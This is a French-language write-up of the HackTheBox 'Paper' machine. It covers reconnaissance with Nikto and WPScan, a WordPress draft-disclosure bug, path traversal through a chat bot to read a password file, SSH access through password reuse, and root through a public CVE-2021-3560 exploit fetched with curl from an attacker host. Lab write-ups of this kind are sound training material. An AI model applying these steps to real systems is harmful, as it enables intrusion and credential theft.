---------------------------------------------------------------------------
+ Target IP:          $IP_CIBLE
+ Target Hostname:    $IP_CIBLE
+ Target Port:        80
+ Start Time:         2022-03-02 15:46:14 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header &#39;x-backend-server&#39; found, with contents: office.paper
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/7.2.24
+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8724 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2022-03-02 15:49:53 (GMT1) (219 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
</code></pre></td></tr></table>
</div>
</div><p>A première vue, nous pourrions penser qu&rsquo;il n&rsquo;y a rien d&rsquo;intéressant ici non plus. Pour être honnête, je suis totalement passé à côté pendant un certain temps&hellip;</p>
<p>Finalement, il y a la ligne suivante : <code>Uncommon header 'x-backend-server' found, with contents: office.paper</code>.</p>
<p>En voyant, cela, j&rsquo;ai donc décidé de rajouter une entrée dans le fichier <code>/etc/hosts</code> faisant pointer l&rsquo;IP de la box vers le nom d&rsquo;hôte <code>office.paper</code>.</p>
<p>Une fois cela fait, en se rendant sur l&rsquo;URL : <code>http://office.paper</code>, nous découvrons un nouveau site tournant sous <code>Wordpress</code> :</p>
<p></p>
<p>Qui dit Wordpress, dit WPScan, c&rsquo;est parti :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">wpscan --url http://office/paper
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">         __          _______   _____                                                                                                                                                                              
         \ \        / /  __ \ / ____|                                                                                                                                                                             
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®                                                                                                                                                            
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \                                                                                                                                                             
            \  /\  /  | |     ____) | (__| (_| | | | |                                                                                                                                                            
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|                                                                                                                                                            
                                                                                                                                                                                                                  
         WordPress Security Scanner by the WPScan Team                                                                                                                                                            
                         Version 3.8.17                                                                                                                                                                           
       Sponsored by Automattic - https://automattic.com/                                                                                                                                                          
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart                                                                                                                                                            
_______________________________________________________________                                                                                                                                                   
                                                                                                                                                                                                                  
[i] It seems like you have not updated the database for some time.                                                                                                                                                
[?] Do you want to update now? [Y]es [N]o, default: [N]Y                                                                                                                                                          
[i] Updating the Database ...                                                                                                                                                                                     
[i] Update completed.                                                                                                                                                                                             
                                                                                                                                                                                                                  
[+] URL: http://office.paper/ [$IP_CIBLE]                                                                                                                                                                     
[+] Started: Thu Mar  3 14:20:45 2022                                                                                                                                                                             
                                                                                                                                                                                                                  
Interesting Finding(s):                                                                                                                                                                                           
                                                                                                                                                                                                                  
[+] Headers                                                                                                                                                                                                        | Interesting Entries:                                                                                                                                                                                          
 |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9                                      
 |  - X-Powered-By: PHP/7.2.24                                                                           
 |  - X-Backend-Server: office.paper                                                                     
 | Found By: Headers (Passive Detection)                                                                 
 | Confidence: 100%                                                                                      
                                                                                                                                                                                                                 
[+] WordPress readme found: http://office.paper/readme.html                                              
 | Found By: Direct Access (Aggressive Detection)                                                        
 | Confidence: 100%                                                                                                                                                                                               
                                                                                                         
[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).                               
 | Found By: Rss Generator (Passive Detection)                                                                                                                                                                   
 |  - http://office.paper/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt;                                                                                                                 
 |  - http://office.paper/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt;                                                                                                        
                                                    
[+] WordPress theme in use: construction-techup                                                                                                                                                                  
 | Location: http://office.paper/wp-content/themes/construction-techup/                                  
 | Last Updated: 2021-07-17T00:00:00.000Z                                                                                                                                                                        
 | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt                                                                                                                                  
 | [!] The version is out of date, the latest version is 1.4                                                                                                                                                     
 | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1                
 | Style Name: Construction Techup                                                                                                                                                                               
 | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a...                                                                                          
 | Author: wptexture                
 | Author URI: https://testerwp.com/                                                                     
 |                                                                                                                                                                                                               
 | Found By: Css Style In Homepage (Passive Detection)          
  |                                                                                                       
 | Version: 1.1 (80% confidence)                                                                         
 | Found By: Style (Passive Detection)                                                                   
 |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: &#39;Version: 1.1&#39; 
                                                                                                                                                                                                                 
[+] Enumerating All Plugins (via Passive Methods)                                                        
                                                                                                         
[i] No plugins Found.                                                                                                                                                                                             
                                                                                                         
[+] Enumerating Config Backups (via Passive and Aggressive Methods)                                      
 Checking Config Backups - Time: 00:00:00 &lt;===================================================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:00
                                                                                                                                                                                                                 
[i] No Config Backups Found.                                                                                                                                                                                      
                                                    
[!] No WPScan API Token given, as a result vulnerability data has not been output.                                                                                                                               
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register    
                                                                                                                                                                                                                 
[+] Finished: Thu Mar  3 14:20:50 2022                                                                                                                                                                           
[+] Requests Done: 180                                                                                                                                                                                           
[+] Cached Requests: 5                                                                                   
[+] Data Sent: 43.575 KB                                                                                                                                                                                         
[+] Data Received: 17.864 MB                                                                                                                                                                                      
[+] Memory used: 229.191 MB         
[+] Elapsed time: 00:00:04
</code></pre></td></tr></table>
</div>
</div><p>Il s&rsquo;agit d&rsquo;un vieux <code>Wordpress</code>, version 5.2.3 ! Un tour rapide sur <a href="https://www.exploit-db.com/exploits/47690" target="_blank" rel="noopener noreferrer">exploit-db</a> nous apprend qu&rsquo;il est vulnérable. La faille en question permet d&rsquo;accéder aux brouillons et autre contenu non publié&hellip; Sur le Wordpress que nous venons de découvrir, il y a justement des commentaires laissant penser que l&rsquo;admin du site à noté des infos dans les brouillons&hellip;</p>
<h2 id="exploitation">Exploitation</h2>
<p>L&rsquo;exploit recommande d&rsquo;utiliser l&rsquo;URL suivante :</p>
<p><code> http://office.paper/?static=1&amp;order=asc</code></p>
<p>Cela ne fonctionne pas&hellip;</p>
<p>Essayons donc, simplement de changer l&rsquo;URL en remplaçant le dernier mot clef par son contraire :</p>
<p><code>http://office.paper/?static=1&amp;order=desc</code></p>
<p>Bingo, cela fonctionne :</p>
<p></p>
<p>Nous découvrons une nouvelle URL &ldquo;secrète&rdquo;, avec un nouveau nom de domaine : <code>chat.office.paper</code>. Nous le rajoutons donc dans notre fichier <code>/etc/hosts</code> afin de pouvoir y accéder.</p>
<p>Une fois cela fait, nous naviguons vers cette URL et nous découvrons, un chat, <code>Rocket Chat</code>. Il est possible de créer un compte, faisons le !</p>
<p>Une fois le compte créé, nous avons accès au chat et à l&rsquo;historique des messages. Après un peu de lecture, nous découvrons qu&rsquo;il existe un bot capable de lister et obtenir des documents et fichiers. Allons lui parler !</p>
<p>Nous remarquons rapidement qu&rsquo;il est assez simple de naviguer dans les fichiers avec la commande <code>recyclops list</code>, et surtout, nous pouvons sortir du dossier actuel avec <code>recyclops list ../</code>. Ce qui liste le contenu de la <code>home</code> de l&rsquo;utilisateur. Au passage, nous voyons aussi son nom : <code>Dwight</code>. Malheureusement, impossible d&rsquo;obtenir le <code>user.txt</code>, ni des fichiers systèmes intéressants.</p>
<p>Cependant, le dossier <code>/home/dwight</code> contient un script <code>bot_restart.sh</code> qui pointe lui-même vers un autre script dans lequel est appelé un fichier <code>.env</code>. Grâce à la commande : <code>recyclops file ../hubot/.env</code> nous pouvons lire le contenu de ce fichier qui contient un mot de passe !!</p>
<p></p>
<p>L&rsquo;utilisateur n&rsquo;est pas présent sur le système, il s&rsquo;agit probablement de l&rsquo;admin du chat. Essayons tout de même le MDP trouvé avec l&rsquo;utilisateur <code>dwight</code> via <code>SSH</code>.</p>
<h3 id="obtenir-un-premier-shell">Obtenir un premier shell</h3>
<p>Bingo ! Un bon gros cas de réutilisation de mot de passe ! <code>Dwight</code> et <code>Recyclops</code> partagent le même MDP. Nous sommes donc sur le machine, en <code>SSH</code> ! C&rsquo;est à dire un super shell, bien stable et facile à relancer en cas de besoin.</p>
<p>Obtenir le <code>flag user</code> est donc un jeu d&rsquo;enfant, via la commande <code>cat</code> :</p>
<p></p>
<h3 id="privesc">PrivEsc</h3>
<p>Désormais, le <code>PrivEsc</code> ! Nous avons un accès utilisateur, mais nous allons chercher à augmenter nos droits afin de devenir <code>root</code> et ainsi avoir le contrôle total de la machine.</p>
<p>Pour ce faire, j&rsquo;aime lancer un scan via <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" target="_blank" rel="noopener noreferrer">LinPeas</a> (WinPeas sous Windows).</p>
<p>Sur toutes les machines <code>HTB</code>, l&rsquo;accès vers internet et coupé. Il faut donc télécharger la dernière version du script sur notre machine &ldquo;attaquante&rdquo; et ensuite l&rsquo;envoyer depuis notre machine vers notre cible. Puisque nous avons un accès <code>SSH</code>, nous pouvons simplement l&rsquo;envoyer via <code>SCP</code>, mais je préfère une méthode plus universelle via un module <code>Python</code>.</p>
<p>Je vais donc vous montrer comment procéder :</p>
<ol>
<li>Sur notre machine qui &ldquo;attaque&rdquo;, il faut se placer dans le dossier contenant le script <code>linpeas.sh</code> puis lancer la commande suivante : <code>python3 -m http.server</code>.</li>
<li>Sur la &ldquo;cible&rdquo;, il faut récupérer le script : <code>curl -O http://$IP_ATTAQUANT:8000/linpeas.sh</code>.</li>
</ol>
<p>Une fois le script téléchargé, nous l&rsquo;éxécutons. Rapidement, Linpeas détecte une vulnérabilité du côté de <code>sudo</code> :</p>
<p></p>
<p>Une recherche rapide sur <a href="https://duckduckgo.com/?q=CVE-2021-3560&#43;exploit&#43;github&amp;t=ffab&amp;ia=web" target="_blank" rel="noopener noreferrer">DDG</a>, nous amène vers un <a href="https://github.com/Almorabea/Polkit-exploit" target="_blank" rel="noopener noreferrer">dépôt Github prometteur</a>.</p>
<p>Même procédure que pour le script <code>linpeas.sh</code>, nous allons récupérer le fichier <code>CVE-2021-3560.py</code> sur notre cible et l&rsquo;exécuter.</p>
<p><strong>NB : avant d&rsquo;exécuter un script, quelque il soit, il est toujours très important de le lire et d&rsquo;essayer de le comprendre ! Vous ne voulez surtout pas exécuter un script qui compromettrait votre machine.</strong></p>
<p>Après quelques secondes, le script nous donne un accès <code>root</code> :</p>
<p></p>
<p>Et nous récupérons enfin le <code>flag root</code> :</p>
<p></p>
<h2 id="outro">Outro</h2>
<p>Cette box était plutôt simple, une très bonne box pour reprendre après plusieurs mois d&rsquo;absence. Elle était aussi assez fun : le header &ldquo;caché&rdquo; était très bien trouvé et m&rsquo;a perdre un temps certain ! Ensuite, le bot du chat était très original et m&rsquo;a bien amusé ! Bref, une super box que je recommande fortement aux débutants.</p>
]]></description></item></channel></rss>